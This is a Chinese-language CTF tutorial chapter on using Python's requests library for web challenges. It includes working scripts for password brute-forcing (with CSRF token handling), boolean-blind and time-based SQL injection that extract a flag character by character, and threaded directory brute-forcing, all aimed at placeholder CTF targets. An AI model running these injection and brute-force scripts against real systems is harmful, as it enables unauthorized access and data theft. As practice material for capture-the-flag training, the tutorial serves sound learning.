---
comments: true
---

# Python脚本

## 为什么要写脚本

做 Web 题的时候，Burp Suite 是我们的主力工具：抓包、改包、重放、Intruder 爆破，大部分手工操作它都能胜任。但总有一些场景，Burp 做不了或者做起来非常别扭：

- **需要"边算边发"**。比如题目要求先从一个接口取一个 token，md5 加密后再拼到下一个请求里；或者要先解一道数学题才能提交答案。这类"每次请求都要先算一步"的逻辑，Burp 没法自动完成。
- **需要大量、精确控制的循环**。比如布尔盲注要逐字符二分猜解，可能要发几百上千个请求，Intruder 虽然能发，但"根据上一个响应决定下一个请求发什么"这种逻辑它表达不了。
- **需要把多个步骤串起来**。登录 → 拿 Cookie → 访问内页 → 提交 flag，一条链路走下来，写脚本比手工点快得多，而且可重复。
- **靶机有频率限制或超时会话**。脚本可以精确控制节奏、自动重连、自动重新登录。

一句话总结：**Burp 适合"我看懂了这个包，改一改再发"，脚本适合"这个操作要重复一千遍"或"下一步发什么取决于上一步的结果"**。CTF 里 SQL 盲注、爆破、条件竞争这类题，本质上都是在考你写脚本的能力。

这一章我们不用任何花哨的库，只用事实标准 `requests`，把它讲到够做题为止。

## requests 库速成

### 安装与最小示例

```bash
pip install requests
```

发一个 GET 请求只需要两行：

```python
import requests

r = requests.get("https://example.com/")
print(r.status_code)   # 状态码，如 200
print(r.text)          # 响应体（按文本解码）
print(r.headers)       # 响应头
```

`requests` 返回的 `Response` 对象上，做题最常用的就这几个属性：

- `r.status_code`：状态码，判断 302 跳转、500 报错全靠它。
- `r.text`：响应文本，找 flag、找报错信息都从这里面找。
- `r.content`：原始字节，下载文件（比如备份文件泄露）时用。
- `r.headers`：响应头字典，有时 flag 或提示就藏在自定义头里。
- `r.url`：最终 URL，配合 302 跳转看被跳到了哪里。

### GET 带参数：params

不要自己手拼 `?a=1&b=2`，交给 `params`，它会自动 URL 编码：

```python
r = requests.get("http://target/index.php", params={"id": "1' or 1=1-- "})
# 实际请求的是 http://target/index.php?id=1%27%20or%201%3D1--%20
```

这一点在 SQL注入 章的练习里很重要：payload 里的单引号、空格、`#` 如果手拼很容易编码错，`params` 帮你规避掉一整类低级错误。

### POST 表单与 JSON

```python
# 表单提交（Content-Type: application/x-www-form-urlencoded）
r = requests.post("http://target/login.php", data={"username": "admin", "password": "123456"})

# JSON 提交（Content-Type: application/json）
r = requests.post("http://target/api/login", json={"username": "admin", "password": "123456"})
```

`data` 发表单，`json` 发 JSON，二者对应的 `Content-Type` 完全不同，服务端解析方式也不同。做题时看 Burp 里抓到的是什么类型，脚本里就用对应的写法，这是新手最常踩的坑之一。

### 自定义 Header

很多题会校验 `User-Agent`、`Referer`、`X-Forwarded-For` 之类的头（详见「Web入门题单」里的相关题）：

```python
headers = {
    "User-Agent": "Mozilla/5.0",
    "Referer": "http://target/admin.php",
    "X-Forwarded-For": "127.0.0.1",
}
r = requests.get("http://target/index.php", headers=headers)
```

### Cookie 与 Session

单次请求可以直接带 Cookie：

```python
r = requests.get("http://target/index.php", cookies={"PHPSESSID": "abc123"})
```

但只要题目涉及"先登录再操作"，就应该用 `Session`：

```python
s = requests.Session()
s.post("http://target/login.php", data={"username": "admin", "password": "123456"})
r = s.get("http://target/admin.php")   # 自动带着登录后的 Cookie
```

`Session` 对象会自动保存和携带服务端下发的 Cookie，后续所有请求都在同一个会话里。可以理解为"脚本里的一个浏览器标签页"。需要固定某个 Cookie（比如伪造身份）时，也可以设置在 Session 上：`s.cookies.set("role", "admin")`。

### 代理：把脚本流量打进 Burp

写脚本排查问题时，最有用的技巧是让脚本走 Burp 的代理，这样脚本发的每个包都能在 Burp 里看到：

```python
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
r = requests.get("http://target/", proxies=proxies, verify=False)
```

`verify=False` 是关闭 HTTPS 证书校验（Burp 的证书脚本不认）。脚本报错"和浏览器看到的不一样"时，先挂上代理对比两个包，九成问题当场现形。

### 超时与重试

网络请求必须给超时，否则靶机卡死时你的脚本会永远挂在那里：

```python
try:
    r = requests.get("http://target/", timeout=5)
except requests.exceptions.Timeout:
    print("超时了，跳过或重试")
```

做延时注入时 `timeout` 还是判断依据（下文会用到）；做条件竞争时则往往故意不给超时。超时值不是越大越好，是"够用即可"。

## 爆破脚本的通用模板

爆破类题目的结构千篇一律：**准备字典 → 循环发包 → 从响应里找"成功特征" → 命中即停**。掌握这个骨架，任何登录爆破、目录爆破、参数爆破都是换皮。

### 一道典型例题

题目：一个登录页面 `http://target/login.php`，提示"管理员的密码是个弱口令"，登录成功返回 flag。已知用户名是 `admin`。

第一步，先用 Burp 手工发一次，确认三件事：请求方法（POST）、参数名（`username` / `password`）、以及 **失败时页面长什么样**（比如返回里有 `password error`），成功时有什么不同（比如 302 跳转或出现 `flag{`）。这三件事决定了脚本怎么写。

第二步，套模板：

```python
import requests

URL = "http://target/login.php"

with open("passwords.txt", "r", encoding="utf-8", errors="ignore") as f:
    passwords = [line.strip() for line in f if line.strip()]

for pwd in passwords:
    r = requests.post(URL, data={"username": "admin", "password": pwd}, timeout=5)
    # 判断成功特征：页面里不再出现失败提示，或者出现了 flag
    if "password error" not in r.text:
        print(f"[+] 找到了！密码是: {pwd}")
        print(r.text)   # 打印页面，flag 一般就在里面
        break
    else:
        print(f"[-] {pwd} 不对")
else:
    print("字典跑完了都没中，换个大点的字典吧")
```

关键点只有三个：

- **成功特征选"否定条件"更稳**。失败页面的提示是固定的（`password error`），而成功页面长什么样你不一定事先知道，所以"不含失败提示即为成功"通常比"包含成功提示"更不容易漏。
- **`for...else`**：循环没被 `break` 打断时才执行 `else`，正好用来提示"字典跑完了"。
- **字典从文件读**，不要把字典硬编码进脚本。常用弱口令字典（如 top1000）网上很多，平时收集一份备用。

如果登录有 CSRF token（每次请求要先从页面里取 token 再提交），模板只需要在循环里加一步"先 GET 页面、用正则抠出 token、再 POST"，这正是 Burp 不擅长而脚本擅长的地方：

```python
import re

s = requests.Session()
for pwd in passwords:
    page = s.get("http://target/login.php", timeout=5)
    token = re.search(r'name="token" value="(\w+)"', page.text).group(1)
    r = s.post("http://target/login.php",
               data={"username": "admin", "password": pwd, "token": token},
               timeout=5)
    if "password error" not in r.text:
        print(f"[+] 密码是: {pwd}")
        break
```

## 盲注与延时注入脚本

这是写脚本最经典的应用，建议先读完「SQL注入」章理解原理，这里只讲"怎么用代码把手工过程自动化"。

### 布尔盲注：逐字符猜解

布尔盲注的核心是：构造一个条件，让页面在条件为真和为假时返回 **可区分** 的两种结果（比如真时有内容、假时空白）。手工做：猜第一个字符是 `a`？不对。是 `b`？不对……一个 32 位的 flag 纯手工要试到天荒地老。脚本把"试"变成循环：

```python
import requests
import string

URL = "http://target/index.php"
CHARSET = string.ascii_lowercase + string.digits + "{}_-"  # flag 可能出现的字符
result = ""

for pos in range(1, 40):   # flag 一般几十位，跑不出就调大
    for c in CHARSET:
        payload = f"1' and substr((select flag from flag),{pos},1)='{c}'-- "
        r = requests.get(URL, params={"id": payload}, timeout=5)
        if "查询成功" in r.text:   # 条件为真时的页面特征
            result += c
            print(f"[+] 第 {pos} 位: {c}, 当前: {result}")
            break
    else:
        break   # 整个字符集都不匹配，说明已经猜到末尾了

print("最终结果:", result)
```

思路拆解：

- `substr(..., pos, 1)` 每次只取一个字符，外层循环控制位置 `pos`，内层循环遍历字符集。
- 判断依据是"条件为真时页面有什么特征"，和爆破一样选稳定特征。
- 字符集 `CHARSET` 越小越快，做题时按 flag 格式合理猜测，别拿全字符集硬跑。

想再快一点，可以把"逐字符比对"换成二分法：用 `ascii(substr(...,pos,1)) > 64` 这类大小比较，每个字符最多 7~8 次请求就能定位。原理一样，留给读者练习。

### 延时注入：没有回显就看时间

当页面真假两种情况下长得一模一样（无回显），就改用 `sleep()`：条件为真时让数据库睡几秒，靠 **响应时间** 区分：

```python
import requests
import string
import time

URL = "http://target/index.php"
CHARSET = string.ascii_lowercase + string.digits + "{}_-"
result = ""
THRESHOLD = 2   # sleep 设 3 秒，超过 2 秒即认为条件为真，留出网络波动余量

for pos in range(1, 40):
    for c in CHARSET:
        payload = f"1' and if(substr((select flag from flag),{pos},1)='{c}',sleep(3),0)-- "
        start = time.time()
        try:
            requests.get(URL, params={"id": payload}, timeout=10)
        except requests.exceptions.Timeout:
            pass   # 超时也视为"睡了"
        elapsed = time.time() - start
        if elapsed > THRESHOLD:
            result += c
            print(f"[+] 第 {pos} 位: {c}, 当前: {result} (耗时 {elapsed:.1f}s)")
            break
    else:
        break

print("最终结果:", result)
```

注意 `timeout` 必须大于 `sleep` 的时间，否则脚本会在数据库睡醒前就自己放弃了。延时注入对网络抖动敏感，拿不准时可以把可疑字符复测一次再确认。

## 多线程提速与结果去重

单线程脚本的速度被"等响应"拖死：每个请求一半时间都在等。目录爆破这类 **请求之间相互独立** 的场景，用线程池能快一个数量级：

```python
import requests
from concurrent.futures import ThreadPoolExecutor

URL = "http://target/"

with open("dirs.txt", encoding="utf-8", errors="ignore") as f:
    words = [line.strip() for line in f if line.strip()]

def check(word):
    try:
        r = requests.get(URL + word, timeout=5)
        if r.status_code != 404:   # 不是 404 就值得一看
            return (word, r.status_code, len(r.text))
    except requests.exceptions.RequestException:
        return None

results = set()   # 用 set 去重
with ThreadPoolExecutor(max_workers=20) as pool:
    for res in pool.map(check, words):
        if res:
            results.add(res)

for word, code, length in sorted(results):
    print(f"[+] /{word}  状态码 {code}  长度 {length}")
```

几个经验点：

- `ThreadPoolExecutor` 够用即止，不用碰 `threading` 原语。`max_workers` 开 10~30 比较稳妥，开太大容易被靶机 ban 或把小型靶机打挂。
- **多线程只适合独立请求**。盲注那种"下一个请求依赖上一个结果"的逻辑没法直接并行（可以按字符位置分片，但初学者不必强求）。
- 去重交给 `set`。爆破/扫目录时经常出现多个路径指向同一页面、或自定义 404 页面返回 200 的情况，除了状态码，**响应长度** 也是很好的去重和筛选维度——大量同长度的 200 往往其实是同一个错误页。

注意，上面登录爆破的例子 **不适合** 盲目上多线程：很多登录接口有失败锁定，并发太高会触发验证码或直接封 IP，反而坏事。提速之前先想清楚目标扛不扛得住。

## 按需学习：边做题边查

最后说点方法论。本章只覆盖了 `requests` 的皮毛，因为做题真的只需要这些。遇到不会的需求再去查，是最快的学法：

- 要传文件（文件上传题的自动利用）→ 查 `requests` 的 `files=` 参数。
- 要处理 JSON 响应 → `r.json()` 直接把响应当字典用。
- 要从 HTML 里抠东西 → 简单的用正则 `re`，复杂的查 `BeautifulSoup`，够用即止，不用系统学。
- 要更猛的并发 → 知道有 `asyncio` + `aiohttp` 这回事即可，CTF 里很少真需要。
- 脚本行为诡异 → 挂 Burp 代理看包，先怀疑脚本发的包和你想的不一样，再怀疑别的。

把每个题写过的小脚本留下来，攒上十几道，你会发现新题的脚本基本都是旧脚本的排列组合——到那时候，写脚本就和用 Burp 一样顺手了。
